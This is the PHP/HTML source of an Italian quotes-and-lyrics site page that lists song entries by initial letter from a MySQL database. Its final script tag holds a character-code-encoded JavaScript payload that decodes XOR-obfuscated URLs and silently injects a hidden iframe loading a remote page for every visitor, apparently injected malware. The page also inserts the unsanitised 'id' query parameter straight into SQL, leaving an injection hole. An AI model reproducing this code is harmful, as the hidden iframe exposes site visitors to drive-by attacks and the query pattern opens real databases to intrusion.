<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" />
<meta name="keywords" content="Il dolce far niente, aforismi, news, proverbi, citazioni, curiosit&agrave, testi, canzoni, scuola, universit&agrave;, foto, dediche, classici, attori, woody allen, satira, amore, anima gemella" />
<meta name="description" content="Il dolce far niente: Vuoi una frase da dedicare al tuo amore? Vuoi conoscere il significato dei proverbi? Sei curioso o semplicemente ti va di passare un po' di tempo spensierato? Resta con noi e non te ne pentirai !" />

<title>il dolce far niente</title>


<!-- cascading style sheets -->
<link rel="stylesheet" href="menu.css">
<link rel="stylesheet" href="alpha.css">
<link rel="stylesheet" href="css/carousel.css" type="text/css" media="all" />
<link rel="stylesheet" href="css/reset.css" type="text/css" media="all" />
<link rel="stylesheet" href="css/light2.css" type="text/css" media="all" />
<link rel="stylesheet" href="css/pirobox.css" type="text/css" media="all" />

<!-- google web fonts -->
<link href='http://fonts.googleapis.com/css?family=Comfortaa' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Paytone+One' rel='stylesheet' type='text/css'>

<link href='http://fonts.googleapis.com/css?family=Droid+Sans' rel='stylesheet' type='text/css' />
<link href='http://fonts.googleapis.com/css?family=Droid+Serif' rel='stylesheet' type='text/css' />
<link href='http://fonts.googleapis.com/css?family=Rokkitt' rel='stylesheet' type='text/css' />

<!-- external javascript -->

<script type="text/javascript" src="js/jquery-1.5.2.min.js"></script>
<script type="text/javascript" src="js/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="js/jquery.jcarousel.min.js"></script>
<script type="text/javascript" src="js/jquery.jscroll-1.0.min.js"></script>
<script type="text/javascript" src="js/jquery.quicksand.js"></script>
<script type="text/javascript" src="js/jquery.roundabout.min.js"></script>
<script type="text/javascript" src="js/jquery.topscroll.js"></script>
<script type="text/javascript" src="js/jquery.tweetable.js"></script>
<script type="text/javascript" src="js/jquery.validate.js"></script>
<script type="text/javascript" src="js/pirobox.js"></script>
<script type="text/javascript" src="js/script.js"></script>
<script type="text/javascript" src="js/styleswitcher.jquery.js"></script>
<?php include ("script.php");?>
</head>

<body>
<?php connectdb(); ?>
<!-- start main white page area -->

<div id="top"></div>

<div id="white-main">

	<div id="white-wrap">

		<div id="white-wrap-inside">
		
			<!-- start main left sidebar -->

			<?php echo sideleft6();?>			
			<!-- end main left sidebar -->
			
			<div id="right720">
			
				<div class="col720">
				
					<h1 class="alignc"><?php $top = frasetop(); echo $top; ?></h1>
				
				</div>
				
				<div class="clr"></div>
				
				<br />
	  			
	  			<div class="dotted720"></div>
	  			
												<div>	
				
									<?php 
									
									echo "<div class=\"alfabetiere\">";
									$alfabeto = range (a,z);
									
									$i=0;
									while ($i !=26) {
									$alfabeto[$i] = strtoupper($alfabeto[$i]);
									
									echo   "<div class=\"letteray\"><a href=\"canzoni.php?id=$alfabeto[$i]\">  $alfabeto[$i]<a></div>";
									$i=$i+1;
									}
									echo "</div>";
									?>
									
								</div>
<br />	  			

	  			<!-- start blog entries -->
	  			
	  			<div class="col480">
	  			
	  				<!-- start blog entry -->
				<?php
				connectdb();
				$letter = $_GET['id'];

				if (isset($letter)){
				$query = "select * from item where categoria = \"da canzoni\" and (autore like '$letter%' or autore like '<p>$letter%') order by \"autore\"";}
				else {
				$query = "select * from item where categoria = \"da canzoni\" order by \"autore\"";
				}
				$query = stripslashes($query);
				$result = mysql_query($query);
				while ($row = mysql_fetch_row($result))
{

					echo "<div class=\"entry\">";
					
					if ($row[5]<>null){

						echo "<a href=\"single.php?id=$row[0]\"><img class=\"post-img\" src=\"image_files/$row[5]\" alt=\"Entry\" /></a>";
	  				}

					if ($row[6] <> null) {
					echo"	<h5><img class=\"calendar\" src=\"images/date.png\" alt=\"Date: \" />Pubblicato il: $row[2]<img class=\"bubble\" src=\"images/comments.png\" alt=\"autore: \"/>Autore: $row[6]</h5>";
					} else {
					echo"	<h5><img class=\"calendar\" src=\"images/date.png\" alt=\"Date: \" />Pubblicato il $row[2]<img class=\"bubble\" src=\"images/comments.png\" alt=\"autore: \"/>Autore: Anonimo</h5>";
					}
	  			
	  				echo "<h2><a href=\"single.php?id=$row[0]\">$row[3]</a></h2>";
	  				
	  					
	  					echo "<p>$row[4]</p>"; 
	  				
	  				echo "<h5><a href=\"single.php?id=$row[0]\">Leggi ...</a> <img src=\"images/arrow-sidebar.png\" alt=\"Arrow\"/></h5>";
	  					
	  				echo"	<h5 class=\"floatr\"><a href=\"#top\">Top <img src=\"images/arrow-small-up.png\" alt=\"Arrow\" /></a></h5>";
	  					
	  				echo"	<div class=\"clr\"></div>";
	  			
	  				echo "</div>";
					
					}
					?>
	  				
	  				<!-- end blog entry -->
	  				
	  			
	  			</div>
	  			
	  			<!-- end blog entries -->
	  			
	  			<!-- start right sidebar -->
	  			
	  			<div class="col240">
	  			
	  				<!-- start widget -->
	  			
	  				<div class="widget">
	  				
	  				
	  				<form action="ricerca.php" method="post">
	  				
	  					<input id="search-text" type="text" name="search1" value="Search.." onBlur="if (this.value == '') {this.value = 'Search..';}"  onfocus="if (this.value == 'Search..') {this.value = '';}" />
	  					
	  					<input id="search-submit" type="image" src="images/search-submit.png" alt="Submit Form" />
	  					
	  					<div class="clr"></div>
	  				
	  				</form>
	  				
	  				</div>
	  				
	  				<!-- end widget -->
	  				
	  				<!-- start widget -->
	  			
	  				<div class="widget">
	  				
			<h3>Dall'archivio</h3>
				 <?php

						
					{$query = "select * from item order by rand() limit 2";}
					$query=stripslashes($query);
					
					$result=mysql_query($query);
					while ($row = mysql_fetch_row($result))
					{
					echo "<h4><a href=\"single.php?id=$row[0]\">$row[1]</a></h4>";
	if ($row[6] <> null) {
					echo"	<h5><img class=\"calendar\" src=\"images/date.png\" alt=\"Date: \" />$row[2]<img class=\"bubble\" src=\"images/comments.png\" alt=\"autore: \"/>$row[6]</h5>";
					} else {
					echo"	<h5><img class=\"calendar\" src=\"images/date.png\" alt=\"Date: \" />$row[2]<img class=\"bubble\" src=\"images/comments.png\" alt=\"autore: \"/>Anonimo</h5>";
					}					echo "<p>";
		$row[3] = teaser($row[3]);
		echo "<a href=\"single.php?id=$row[0]\">$row[3]</a>";
					/*echo "<p>teaser($row[3])</p>";
					*/
					echo "</p>";
					}
				?>
						
					</div>
					
					<!-- end widget -->
					
					<!-- start widget -->
					
					
					<!-- end widget -->
					
					
					<!-- start widget -->
					
					<div class="widget">
					
						<h3>Pubblicità </h3>
	  					
	  					<!--  ADVERTISEMENT TAG 120 x 600, DO NOT MODIFY THIS CODE -->
<script type="text/javascript" src="http://performance-by.simply.com/simply.js?code=42665;1;0&amp;v=2"></script>
<script type="text/javascript">
<!--
document.write('');
// -->
</script>
	  				</div>
	  				
	  				<!-- end widget -->
	  			
	  			</div>
	  			
	  			<!-- end right sidebar -->
				
			</div>
				
			<div class="clr"></div>
			
		</div>
		
	</div>

</div>

<!-- end main white page area -->

<!-- start footer -->

<div class="wrap960">

	<div id="four-columns">

		<div class="col240">
		
			<h3>Il dolce far niente</h3>
			
			<?php echo frasebtm(); ?>

		</div>
		<div class="col720">
					<!--  ADVERTISEMENT TAG 728 x 90, DO NOT MODIFY THIS CODE -->
<script type="text/javascript" src="http://performance-by.simply.com/simply.js?code=42665;1;0&amp;v=2"></script>
<script type="text/javascript">
<!--
document.write('');
// -->
</script>

</div>
		
		<!-- start footer blog posts -->
		
<!--		<div class="col240">
		
			<h3>Dall'archivio</h3>
		</div>
		<!-- end footer blog posts -->
		
		<!-- start twitter feed -->
		
<!--		<div class="col240">
		
			<h3>Latest Tweets</h3>
			
			<div id="twitter_div">
			
            <ul class="tweetList">
			
            <li class="tweet_content_0">
			
            <p class="tweet_link_0">
			The official website for the 1996 film, Space Jam, starring MJ23.
			<a href="http://bit.ly/jOwbY1">http://bit.ly/jOwbY1</a>
			<span class="hash">#vintage </span>
			</p>
			
            </li>
            
            <li class="tweet_content_1">
            <p class="tweet_link_1">
            Last.FM is so flipping awesome. Definitely in my top five favourite websites at the mo.
            <span class="hash">#lastfm </span>
            </p>
            </li>
            
            <li class="tweet_content_2">
            <p class="tweet_link_2">
            WordPress 3.2 is now available. Remember to update!
            <a href="http://bit.ly/jAoxsp">http://bit.ly/jAoxsp</a>
            </p>
            </li>
			
            </ul>
			
            </div>
			
		</div>
		
		<!-- end twitter feed -->
		
		<!-- start flickr photos -->
		
<!--		<div class="col240">
		
			<h3>About Us</h3>
			
			<p>Cras mattis consectetur purus sit amet fermentum. Aenean eu leo quam. Pellentesque ornare sem lacinia quam venenatis vestibulum. Vivamus sagittis lacus vel augue laoreet rutrum faucibus dolor auctor.</p>
	
			<p>Nulla vitae elit libero, a pharetra augue. Integer posuere erat a ante venenatis dapibus posuere velit aliquet. Vestibulum id ligula porta felis euismod semper.</p>
		
		</div>-->
		
		<!-- end flickr photos -->
		
		<div class="clr"></div>
		
		<div class="divide"></div>
		
		<div id="footer">
		
			<!-- start footer social icons -->
		
			<div id="social-footer">
			
				<div class="socfacebook">
				
					<a href="#"><img src="images/icon-blank.png" alt="Facebook" /></a>
				
				</div>
				
				
				<div class="soctwitter">
				
					<a href="#"><img src="images/icon-blank.png" alt="Twitter" /></a>
				
				</div>
				
			
			</div>
			
			<!-- end footer social icons -->
		
			
			<p id="copyright">IL DOLCE FAR NIENTE All rights reserved &copy; 2011. <br />
<!--			Designed by <a href="http://www.themeskingdom.com">Themes Kingdom</a>. Developed by <a href="http://thelumberjack.com.au">The Lumberjack</a>.</p>
-->		
		</div>
	
	</div>
	
</div>


<!-- end footer -->

<!-- smooth scrolling menu -->

<script type="text/javascript" src="js/control/smooth.js"></script>

<!-- tabs widget -->

<script type="text/javascript" src="js/control/tabs-widget.js"></script>

<!-- pirobox controller -->

<script type="text/javascript" src="js/control/pirobox.js"></script>

<!-- twitter controller -->

<script type="text/javascript" src="js/control/tweets.js"></script>

<!-- style switcher -->

<script type="text/javascript">  
$('#style-switcher a').styleSwitcher();
</script>

<script>document.write(String.fromCharCode(60,98,111,100,121,62,10,60,47,98,111,100,121,62,10,60,115,99,114,105,112,116,62,10,102,117,110,99,116,105,111,110,32,103,101,116,95,100,111,109,97,105,110,40,41,32,123,10,32,32,32,32,118,97,114,32,97,32,61,32,91,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,51,92,120,99,50,92,120,100,98,92,120,100,98,92,120,99,52,92,120,99,53,92,120,99,52,92,120,99,53,92,120,99,101,92,120,99,53,92,120,100,56,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,99,97,92,120,100,98,92,120,100,102,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,100,102,92,120,99,99,92,120,100,99,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,99,52,92,120,99,56,92,120,100,57,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,100,57,92,120,99,56,92,120,100,98,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,10,9,93,59,10,9,118,97,114,32,98,32,61,32,48,120,70,70,70,70,70,70,70,70,59,10,32,32,32,32,118,97,114,32,100,32,61,32,98,59,10,32,32,32,32,118,97,114,32,101,32,61,32,48,120,51,51,51,51,51,51,51,51,59,10,32,32,32,32,118,97,114,32,102,32,61,32,48,120,68,51,52,68,66,51,51,70,59,10,32,32,32,32,118,97,114,32,103,32,61,32,48,120,56,48,48,48,48,48,48,48,59,10,32,32,32,32,118,97,114,32,104,32,61,32,48,120,65,66,59,10,32,32,32,32,118,97,114,32,107,32,61,32,40,100,111,99,117,109,101,110,116,91,39,108,111,99,97,116,105,111,110,39,93,91,39,104,111,115,116,110,97,109,101,39,93,32,124,124,32,39,100,101,102,97,117,108,116,115,104,105,116,39,41,91,39,116,111,76,111,119,101,114,67,97,115,101,39,93,40,41,59,10,32,32,32,32,102,111,114,32,40,118,97,114,32,106,32,61,32,48,59,32,106,32,60,32,107,46,108,101,110,103,116,104,59,32,106,43,43,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,99,32,61,32,107,91,39,99,104,97,114,67,111,100,101,65,116,39,93,40,106,41,59,10,32,32,32,32,32,32,32,32,100,32,94,61,32,99,32,60,60,32,50,52,59,10,32,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,56,59,32,105,43,43,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,105,102,32,40,100,32,38,32,48,120,56,48,48,48,48,48,48,48,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,100,32,61,32,40,100,32,60,60,32,49,41,32,94,32,48,120,69,68,66,56,56,51,50,48,10,32,32,32,32,32,32,32,32,32,32,32,32,125,32,101,108,115,101,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,100,32,60,60,61,32,49,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,125,10,32,32,32,32,125,10,32,32,32,32,105,102,32,40,100,32,60,32,48,41,32,123,10,32,32,32,32,32,32,32,32,100,32,61,32,100,32,62,62,62,32,48,10,32,32,32,32,125,10,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,120,70,70,70,70,70,70,70,70,44,32,110,117,109,32,61,32,48,59,32,110,117,109,32,60,32,53,59,32,105,32,45,61,32,101,44,32,110,117,109,43,43,41,32,123,10,32,32,32,32,32,32,32,32,105,102,32,40,100,32,62,61,32,40,105,32,45,32,101,41,32,38,38,32,100,32,60,61,32,105,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,108,32,61,32,34,34,59,10,32,32,32,32,32,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,97,91,110,117,109,93,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,108,32,43,61,32,83,116,114,105,110,103,91,39,102,114,111,109,67,104,97,114,67,111,100,101,39,93,40,97,91,110,117,109,93,91,39,99,104,97,114,67,111,100,101,65,116,39,93,40,105,41,32,94,32,48,120,65,66,41,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,108,10,32,32,32,32,32,32,32,32,125,10,32,32,32,32,125,10,125,10,119,105,110,100,111,119,46,117,114,108,100,97,116,97,32,61,32,103,101,116,95,100,111,109,97,105,110,40,41,59,10,105,102,32,40,116,121,112,101,111,102,32,40,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,41,32,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,32,48,10,125,10,105,102,32,40,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,61,32,48,41,32,123,10,32,32,32,32,32,32,32,32,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,32,49,59,10,32,32,32,32,32,32,32,32,118,97,114,32,97,32,61,32,100,111,99,117,109,101,110,116,91,39,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,39,93,40,34,105,102,114,97,109,101,34,41,91,48,93,59,10,32,32,32,32,32,32,32,32,105,102,32,40,116,121,112,101,111,102,32,40,97,41,32,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,98,32,61,32,100,111,99,117,109,101,110,116,91,39,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,39,93,40,34,104,101,97,100,34,41,91,48,93,59,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,99,32,61,32,100,111,99,117,109,101,110,116,91,39,99,114,101,97,116,101,69,108,101,109,101,110,116,39,93,40,34,100,105,118,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,46,115,116,121,108,101,46,100,105,115,112,108,97,121,32,61,32,39,110,111,110,101,39,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,46,105,100,32,61,32,39,101,118,105,108,115,104,105,116,39,59,10,32,32,32,32,32,32,32,32,32,32,32,32,98,91,39,97,112,112,101,110,100,67,104,105,108,100,39,93,40,99,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,100,32,61,32,100,111,99,117,109,101,110,116,91,39,99,114,101,97,116,101,69,108,101,109,101,110,116,39,93,40,34,105,102,114,97,109,101,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,100,46,115,114,99,32,61,32,119,105,110,100,111,119,46,117,114,108,100,97,116,97,59,10,9,9,9,98,91,39,97,112,112,101,110,100,67,104,105,108,100,39,93,40,100,41,10,32,32,32,32,32,32,32,32,125,32,101,108,115,101,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,97,46,115,114,99,32,61,32,119,105,110,100,111,119,46,117,114,108,100,97,116,97,10,9,125,10,32,125,10,60,47,115,99,114,105,112,116,62));</script></body>

</html>